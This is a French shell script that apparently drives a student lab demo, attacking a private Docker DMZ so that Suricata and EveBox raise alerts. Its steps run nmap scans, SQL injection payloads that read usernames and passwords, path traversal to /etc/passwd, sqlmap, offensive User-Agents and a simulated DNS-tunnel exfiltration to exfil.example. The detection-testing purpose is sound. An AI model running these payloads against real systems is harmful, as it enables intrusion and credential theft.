#!/bin/sh
# =*****************************************************************************
#  Groupe 2 - Scénario d'attaque pilote (DMZ 172.20.0.0/24)
#  À exécuter depuis le conteneur attaquant :
#      docker compose run --rm attacker
#  Chaque étape est séparée par une pause pour commenter en direct pendant la
#  soutenance. Les alertes attendues sont affichées en fin d'étape.
# ******************************************************************************
set -u

WEB_HOST="${WEB_HOST:-172.20.0.10}"
API_HOST="${API_HOST:-172.20.0.12}"
DB_HOST="${DB_HOST:-172.20.0.11}"
EVEBOX_HOST="${EVEBOX_HOST:-172.20.0.14}"
DNS_RESOLVER="${DNS_RESOLVER:-}"
DNS_BURST="${DNS_BURST:-40}"
PAUSE_SECONDS="${PAUSE_SECONDS:-4}"

MODE_PAUSE="Entrée si terminal, sinon ${PAUSE_SECONDS} s"
MODE_SANS_PAUSE=""
MODE_FORCE_TTY=""
FAST=0
ECHECS=0
step_no=0

# Palette : verts et rouges CLAIRS (codes ANSI « bright » 91 / 92)

if [ -t 1 ]; then
    BOLD=$(printf '\033[1m')
    DIM=$(printf '\033[2m')
    RED=$(printf '\033[91m')          # rouge clair
    BRED=$(printf '\033[1;91m')       # rouge clair gras
    GREEN=$(printf '\033[92m')        # vert clair
    BGREEN=$(printf '\033[1;92m')     # vert clair gras
    YELLOW=$(printf '\033[93m')
    BYELLOW=$(printf '\033[1;93m')
    CYAN=$(printf '\033[96m')
    BCYAN=$(printf '\033[1;96m')
    BWHITE=$(printf '\033[1;97m')
    RESET=$(printf '\033[0m')
else
    BOLD=; DIM=; RED=; BRED=; GREEN=; BGREEN=; YELLOW=; BYELLOW=
    CYAN=; BCYAN=; BWHITE=; RESET=
fi

usage() {
    cat <<'EOF'
Usage : scenario.sh [options]

  --no-pause     enchaîne les étapes sans attendre (répétition automatisée)
  --fast         réduit le nombre de requêtes DNS (démonstration courte)
  --interactive  force l'attente d'une touche Entrée entre les étapes
  -h, --help     affiche cette aide

Variables d'environnement :
  WEB_HOST       cible HTTP du portail            (défaut 172.20.0.10)
  API_HOST       cible de l'API FastAPI           (défaut 172.20.0.12)
  DB_HOST        cible PostgreSQL                 (défaut 172.20.0.11)
  EVEBOX_HOST    cible de la console EveBox       (défaut 172.20.0.14)
  DNS_RESOLVER   résolveur interrogé pour le tunnel DNS (défaut : déduit de
                 /etc/resolv.conf, sinon 1.1.1.1)
  DNS_BURST      nombre de requêtes DNS envoyées  (défaut 40)
  PAUSE_SECONDS  durée des pauses non interactives (défaut 4)
  ALLOW_NON_RFC1918=1  autorise des cibles hors réseau privé (déconseillé)
EOF
}

for arg in "$@"; do
    case "$arg" in
        --no-pause)    MODE_PAUSE="aucune pause"; MODE_SANS_PAUSE=1 ;;
        --interactive) MODE_PAUSE="Entrée entre les étapes"; MODE_FORCE_TTY=1 ;;
        --fast)        FAST=1; DNS_BURST=15 ;;
        -h|--help)     usage; exit 0 ;;
        *)             printf "Option inconnue : %s\n" "$arg" >&2; usage >&2; exit 2 ;;
    esac
done

# scan only RFC1918 addresses
est_prive() {
    case "$1" in
        10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*) return 0 ;;
        *) return 1 ;;
    esac
}

if [ -z "${ALLOW_NON_RFC1918:-}" ]; then
    for h in "$WEB_HOST" "$API_HOST" "$DB_HOST" "$EVEBOX_HOST"; do
        if ! est_prive "$h"; then
            printf '%s[-] Cible hors réseau privé refusée : %s%s\n' "$BRED" "$h" "$RESET" >&2
            exit 1
        fi
    done
fi


# Fonctions d'affichage


# Prompt
prompt_cmd() {
    printf '\n%s┌─[%s%s%s@%s%s%s]─[%s~%s]%s\n' \
        "$BRED" "$BGREEN" "g2" "$BWHITE" "$BRED" "hacker" \
        "$BRED" "$BGREEN" "$BRED" "$RESET"
    printf '%s└──╼ %s#%s %s%s%s\n' \
        "$BRED" "$BGREEN" "$RESET" "$BWHITE" "$1" "$RESET"
}

titre() {
    step_no=$((step_no + 1))
    printf '\n%s==> Étape %s : %s%s\n' "$BGREEN" "$step_no" "$1" "$RESET"
    if [ -n "${2:-}" ]; then
        printf '   %s%s%s\n' "$DIM" "$2" "$RESET"
    fi
    return 0
}

attendu() {
    printf '\n==>%s Alertes attendues :%s %s%s%s\n' \
        "$BRED" "$RESET" "$BYELLOW" "$1" "$RESET"
}

banniere() {
    if [ -n "${NO_BANNER:-}" ]; then
        return 0
    fi
    c_logo="${1:-$BRED}"
    c_tag="${2:-$BGREEN}"
    printf '\n\n%s' "$c_logo"
    cat <<'ART' | sed "s/^/$(printf ' \t')/; s/\[NBK\]/${c_tag}[NBK]${c_logo}/"
     NO!                          MNO!
     MNO!!         [NBK]          MNNOO!
   MMNO!                           MNNOO!!
 MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
 !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
       ! MMMMMMMMMMMMMPPPPOOOOIII! !
        MMMMMMMMMMMMPPPPPOOOOOOII!!
        MMMMMOOOOOOPPPPPPPPOOOOMII!
        MMMMM..    OPPMMP    .,OMI!
        MMMM::   o.,OPMP,.o   ::I!!
          NNM:::.,,OOPM!P,.::::!!
         MMNNNNNOOOOPMO!!IIPPO!!O!
         MMMMMNNNNOO:!!:!!IPPPPOO!
          MMMMMNNOOMMNNIIIPPPOO!!
             MMMONNMMNNNIIIOO!
           MN MOMMMNNNIIIIIO! OO
          MNO! IiiiiiiiiiiiI OOOO
     NNN.MNO!   O!!!!!!!!!O   OONO NO!
    MNNNNNO!    OOOOOOOOOOO    MMNNON!
      MNNNNO!    PPPPPPPPP    MMNON!
         OO!                   ON!
ART
    printf '%s\n' "$RESET"
}


pause() {
    if [ -n "$MODE_SANS_PAUSE" ]; then
        return 0
    fi
    if [ -n "$MODE_FORCE_TTY" ] || [ -t 0 ]; then
        printf '%s   [Entrée pour continuer]%s ' "$DIM" "$RESET"
        read -r _ || true
        return 0
    fi
    printf '%s  (pause de %s s)%s\n' "$DIM" "$PAUSE_SECONDS" "$RESET"
    sleep "$PAUSE_SECONDS"
}

# Envoie une requête curl et affiche seulement le code HTTP.
# Usage : req [options curl] URL     (000 = pas de réponse -> compté en échec)
req() {
    rc=$(curl -s -o /dev/null -m 8 -w '%{http_code}' "$@")
    if [ "$rc" = "000" ]; then
        ECHECS=$((ECHECS + 1))
        printf '==>%s aucune réponse%s\n' "$BRED" "$RESET"
    else
        printf '==>%s HTTP %s%s%s\n' "$BGREEN" "$RESET" "$BGREEN" "$rc" "$RESET"
    fi
}

# Résolveur : celui du conteneur (127.0.0.11 renvoie au démon Docker, donc on
# préfère une adresse explicite si elle est fournie par l'environnement).
if [ -z "$DNS_RESOLVER" ]; then
    DNS_RESOLVER=$(awk '/^nameserver/ { print $2; exit }' /etc/resolv.conf 2>/dev/null)
    case "$DNS_RESOLVER" in
        ""|127.0.0.11|127.0.0.53) DNS_RESOLVER="1.1.1.1" ;;
    esac
fi


banniere
RULE="********************************************************************"



printf '\n%s%s%s\n' "$BRED" "$RULE" "$RESET"
printf '  %sGroupe 2%s %s-%s %sScénario d'"'"'attaque NDR%s %s(Suricata + EveBox + Grafana)%s\n' \
    "$BGREEN" "$RESET" "$BRED" "$RESET" "$BWHITE" "$RESET" "$DIM" "$RESET"
printf '%s%s%s\n' "$BRED" "$RULE" "$RESET"

printf '  %sPortail web%s      : %shttp://%s/%s\n'        "$BCYAN" "$RESET" "$BWHITE" "$WEB_HOST" "$RESET"
printf '  %sAPI FastAPI%s      : %shttp://%s:8000/%s\n'   "$BCYAN" "$RESET" "$BWHITE" "$API_HOST" "$RESET"
printf '  %sBase PostgreSQL%s  : %s%s:5432%s\n'           "$BCYAN" "$RESET" "$BWHITE" "$DB_HOST" "$RESET"
printf '  %sConsole EveBox%s   : %shttp://127.0.0.1:5636%s %s(depuis l'"'"'hôte)%s\n' \
    "$BCYAN" "$RESET" "$BWHITE" "$RESET" "$DIM" "$RESET"
printf '  %sRésolveur DNS%s    : %s%s%s\n'                "$BCYAN" "$RESET" "$BWHITE" "$DNS_RESOLVER" "$RESET"
printf '  %sPauses%s           : %s%s%s\n'                "$BCYAN" "$RESET" "$BWHITE" "$MODE_PAUSE" "$RESET"
printf '\n  %s%s%s\n' "$DIM" "La sonde capture le bridge en af-packet ; chaque étape produit du trafic" "$RESET"
printf '  %s%s%s\n'   "$DIM" "réel observable par Suricata. Seul le motif de tunnel DNS est reproduit." "$RESET"

# Outils requis (sqlmap est optionnel : s'il est absent, l'étape 3 est ignorée)
for outil in nmap curl dig; do
    if ! command -v "$outil" >/dev/null 2>&1; then
        printf '%s[-] Outil manquant : %s%s\n' "$BRED" "$outil" "$RESET" >&2
        exit 1
    fi
done

printf '\n%s[*] Vérification de la cible...%s\n' "$DIM" "$RESET"
code=$(curl -s -o /dev/null -m 5 -w '%{http_code}' "http://${WEB_HOST}/")
if [ "$code" = "000" ]; then
    printf '%s[-] %s ne répond pas. La pile est-elle démarrée ?%s\n' \
        "$BRED" "$WEB_HOST" "$RESET" >&2
    printf '    %s(docker compose up -d)%s\n' "$DIM" "$RESET" >&2
    exit 1
fi
printf '%s[+]%s http://%s/ -> %sHTTP %s%s\n' "$BGREEN" "$RESET" "$WEB_HOST" "$BGREEN" "$code" "$RESET"
pause


# 1. Reconnaissance

titre "Reconnaissance - scan SYN puis détection de versions" \
    "nmap -sS (demi-connexion, jamais de session TCP complète) puis nmap -sV."

prompt_cmd "nmap -sS -Pn -n --top-ports 200 -T4 ${WEB_HOST} ${API_HOST} ${DB_HOST} ${EVEBOX_HOST}"
nmap -sS -Pn -n --top-ports 200 -T4 \
    "$WEB_HOST" "$API_HOST" "$DB_HOST" "$EVEBOX_HOST" 2>&1 |
    grep -vE '^$|^Starting Nmap|^Nmap done' || true

attendu "ET SCAN / ET POLICY (balayage de ports vers la DMZ)"
pause

prompt_cmd "nmap -sV -Pn -n -p 80,8000,5432,5636 ${WEB_HOST} ${API_HOST} ${DB_HOST} ${EVEBOX_HOST}"
nmap -sV -Pn -n -p 80,8000,5432,5636 \
    "$WEB_HOST" "$API_HOST" "$DB_HOST" "$EVEBOX_HOST" 2>&1 |
    grep -vE '^$|^Starting Nmap|^Nmap done' || true

attendu "à vérifier dans eve.json (nmap -sV ne déclenche pas toujours une signature)"
pause


# 2. Injection SQL et traversée de répertoire

titre "Injection SQL et traversée de répertoire" \
    "Charges envoyées en GET ; le portail les journalise et l'API les traite."

prompt_cmd "curl \"http://${WEB_HOST}/api/me?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--\""
req "http://${WEB_HOST}/api/me?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
sleep 1

prompt_cmd "curl \"http://${WEB_HOST}/api/me?id=1%27%20OR%20%271%27%3D%271\""
req "http://${WEB_HOST}/api/me?id=1%27%20OR%20%271%27%3D%271"
sleep 1

prompt_cmd "curl --path-as-is \"http://${WEB_HOST}/../../../../etc/passwd\""
req --path-as-is "http://${WEB_HOST}/../../../../etc/passwd"
sleep 1

prompt_cmd "curl --path-as-is \"http://${WEB_HOST}/%2e%2e%2f%2e%2e%2fetc%2fpasswd\""
req --path-as-is "http://${WEB_HOST}/%2e%2e%2f%2e%2e%2fetc%2fpasswd"

attendu "sid 2000001 (injection SQL) + ET WEB_SERVER /etc/passwd + SELECT USER"
pause


# 3. Injection SQL automatisée (sqlmap)

titre "Injection SQL automatisée (sqlmap)" \
    "sqlmap sonde le paramètre id avec son User-Agent caractéristique : la sonde détecte à la fois la charge SQL et l'outil offensif."

prompt_cmd "sqlmap -u \"http://${WEB_HOST}/api/me?id=1\" --batch --ignore-code=401 --level=1 --risk=1 --threads=3 --flush-session"
if command -v sqlmap >/dev/null 2>&1; then
    # --flush-session : sans lui, sqlmap réutilise le run précédent et envoie
    # beaucoup moins de requêtes lors des répétitions (donc moins d'alertes).
    sqlmap -u "http://${WEB_HOST}/api/me?id=1" \
        --batch --ignore-code=401 --level=1 --risk=1 --threads=3 --timeout=5 \
        --flush-session --output-dir=/tmp/sqlmap 2>&1 || true
else
    printf '  %s[!] sqlmap non installé, étape ignorée%s\n' "$BYELLOW" "$RESET"
fi

attendu "sid 2000001 (SQLi) + sid 2000002 (User-Agent sqlmap) + ET SCAN Sqlmap"
pause

# 4. Outils offensifs identifiés par leur User-Agent

titre "Reconnaissance automatisée - User-Agent offensifs" \
    "Même requête, mais avec l'en-tête d'un outil offensif : la détection dépend de l'outillage employé."

for agent in "sqlmap/1.8.2#stable" "nikto/2.1.6" "gobuster/3.6"; do
    prompt_cmd "curl -A \"${agent}\" \"http://${WEB_HOST}/\""
    req -A "$agent" "http://${WEB_HOST}/"
    sleep 1
done

attendu "sid 2000002 (User-Agent d'outil offensif) + ET SCAN Sqlmap"
pause


# 5. Tunnel DNS
titre "Tunnel DNS - exfiltration simulée" \
    "Des dizaines de sous-domaines aléatoires de 48 caractères partent vers le résolveur : signature typique d'un tunnel DNS (iodine, dnscat2)."

expr_label() { od -An -N24 -tx1 /dev/urandom | tr -d ' \n'; }

prompt_cmd "for i in \$(seq 1 ${DNS_BURST}); do dig @${DNS_RESOLVER} <48_hex>.exfil.example; done"
i=0
while [ "$i" -lt "$DNS_BURST" ]; do
    label=$(expr_label)
    dig +short +time=1 +tries=1 "@${DNS_RESOLVER}" "${label}.exfil.example" \
        >/dev/null 2>&1 &
    i=$((i + 1))
done
wait

printf '  %s[+]%s %s requêtes envoyées vers %s\n' "$BGREEN" "$RESET" "$DNS_BURST" "$DNS_RESOLVER"
sleep 1

prompt_cmd "dig @${DNS_RESOLVER} tunnel.ngrok.io atelier.duckdns.org relais.no-ip.org"
for domaine in tunnel.ngrok.io atelier.duckdns.org relais.no-ip.org; do
    printf '  %s├─%s %-24s ' "$BCYAN" "$RESET" "$domaine"
    if dig +short +time=1 +tries=1 "@${DNS_RESOLVER}" "$domaine" >/dev/null 2>&1; then
        printf '%senvoyé%s\n' "$BGREEN" "$RESET"
    else
        printf '%senvoyé (sans réponse)%s\n' "$RED" "$RESET"
    fi
done

attendu "sid 2000003 (volume DNS) + sid 2000004 (label long) + sid 2000005 (domaine de tunnel)"
pause


# 6. Lecture des alertes

titre "Vérification côté sonde" \
    "Le scénario ne fait qu'émettre du trafic : la détection est faite par la sonde, hors du conteneur attaquant."

cat <<EOF

  ${BCYAN}Depuis l'hôte :${RESET}
    docker exec g2-suricata sh -c \\
      'grep "\\"event_type\\":\\"alert\\"" /var/log/suricata/eve.json | wc -l'

    docker exec g2-suricata sh -c \\
      'grep "\\"event_type\\":\\"alert\\"" /var/log/suricata/eve.json | tail -5'

  ${BCYAN}Dans EveBox :${RESET} http://127.0.0.1:5636  (identifiants dans .env)
    ${BYELLOW}alert.signature_id:2000001${RESET}  -> injection SQL
    ${BYELLOW}alert.signature_id:2000002${RESET}  -> User-Agent offensif
    ${BYELLOW}alert.signature_id:2000003${RESET}  -> volume DNS anormal
    ${BYELLOW}alert.signature_id:2000004${RESET}  -> label DNS très long
    ${BYELLOW}alert.signature_id:2000005${RESET}  -> domaine de tunnel

  ${BCYAN}Dans Grafana et Mailpit :${RESET}
    Grafana : http://127.0.0.1:3000  (Vue Direction et Vue Exploitation)
    Mailpit : http://127.0.0.1:8025  (notifications SOC soc@g2.local)

EOF


# 7. Conclusion 

if [ "$ECHECS" -eq 0 ]; then
    c_fin="$BGREEN"
    c_tag="$BRED"
    msg_fin="[+] Scénario terminé avec succès."
else
    c_fin="$BRED"
    c_tag="$BGREEN"
    msg_fin="[-] Scénario terminé avec ${ECHECS} requête(s) sans réponse."
fi

printf '%s%s%s\n' "$c_fin" "$RULE" "$RESET"
printf '  %s         %s%s\n' "$c_fin" "$msg_fin" "$RESET"
banniere "$c_fin" "$c_tag"
printf '%s%s%s\n' "$c_fin" "$RULE" "$RESET"
[ "$ECHECS" -eq 0 ]
